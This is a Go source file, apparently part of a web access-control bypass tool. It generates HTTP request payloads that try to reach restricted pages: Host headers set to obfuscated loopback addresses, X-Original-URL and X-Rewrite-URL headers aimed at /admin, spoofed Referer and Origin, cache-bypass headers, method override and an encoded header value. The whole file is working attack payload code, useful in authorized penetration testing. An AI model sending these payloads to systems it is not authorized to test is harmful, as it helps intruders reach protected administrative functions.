package techniques

import (
	"net/url"
	"strings"
)

func (Advanced) Name() string { return "advanced" }

type Advanced struct{}

func (Advanced) Generate(ctx Context) []Payload {
	var out []Payload

	// Advanced IP bypass techniques
	advancedIPs := []string{
		"0x7f.0.0.1",          // Hex dot notation
		"0177.0.0.1",          // Octal
		"0x7f000001",          // Hex
		"2130706433",          // Decimal
		"127.1",               // Short form
		"127.0.1",             // Short form
		"0",                   // All interfaces
		"localhost.localdomain",
		"::ffff:127.0.0.1",   // IPv6-mapped IPv4
		"0:0:0:0:0:0:0:1",     // Full IPv6 loopback
	}

	// Host header manipulation
	for _, ip := range advancedIPs {
		out = append(out, Payload{
			Method:      "GET",
			URL:         ctx.Target,
			Description: "Host: " + ip,
			Detail:      "Host header bypass: " + ip,
			Headers:     map[string]string{"Host": ip},
			Technique:   "advanced",
		})
	}

	// X-Original-URL header
	out = append(out, Payload{
		Method:      "GET",
		URL:         ctx.Target,
		Description: "X-Original-URL bypass",
		Detail:      "X-Original-URL header injection",
		Headers:     map[string]string{"X-Original-URL": "/admin"},
		Technique:   "advanced",
	})

	// X-Rewrite-URL header
	out = append(out, Payload{
		Method:      "GET",
		URL:         ctx.Target,
		Description: "X-Rewrite-URL bypass",
		Detail:      "X-Rewrite-URL header injection",
		Headers:     map[string]string{"X-Rewrite-URL": "/admin"},
		Technique:   "advanced",
	})

	// Referer-based bypass
	out = append(out, Payload{
		Method:      "GET",
		URL:         ctx.Target,
		Description: "Referer bypass",
		Detail:      "Referer: internal domain",
		Headers:     map[string]string{"Referer": ctx.Target},
		Technique:   "advanced",
	})

	// Origin header
	out = append(out, Payload{
		Method:      "GET",
		URL:         ctx.Target,
		Description: "Origin bypass",
		Detail:      "Origin header manipulation",
		Headers:     map[string]string{"Origin": ctx.Target},
		Technique:   "advanced",
	})

	// Cache-bypass headers
	cacheHeaders := []string{
		"Cache-Control: no-cache",
		"Pragma: no-cache",
		"X-Cache-Bypass: true",
	}
	for _, h := range cacheHeaders {
		parts := strings.SplitN(h, ": ", 2)
		if len(parts) == 2 {
			out = append(out, Payload{
				Method:      "GET",
				URL:         ctx.Target,
				Description: h,
				Detail:      "Cache bypass: " + h,
				Headers:     map[string]string{parts[0]: parts[1]},
				Technique:   "advanced",
			})
		}
	}

	// Method override via header
	out = append(out, Payload{
		Method:      "POST",
		URL:         ctx.Target,
		Description: "X-HTTP-Method-Override: GET",
		Detail:      "Method override via header",
		Headers:     map[string]string{"X-HTTP-Method-Override": "GET"},
		Technique:   "advanced",
	})

	// Content-Type manipulation
	out = append(out, Payload{
		Method:      "POST",
		URL:         ctx.Target,
		Description: "Content-Type: application/x-www-form-urlencoded",
		Detail:      "Content-Type manipulation",
		Headers:     map[string]string{"Content-Type": "application/x-www-form-urlencoded"},
		Body:        []byte(""),
		Technique:   "advanced",
	})

	// URL encoding bypass
	encodedURL := url.QueryEscape(ctx.Target)
	out = append(out, Payload{
		Method:      "GET",
		URL:         ctx.Target,
		Description: "URL encoded parameter",
		Detail:      "Double URL encoding",
		Headers:     map[string]string{"X-Original-URL": encodedURL},
		Technique:   "advanced",
	})

	return out
}
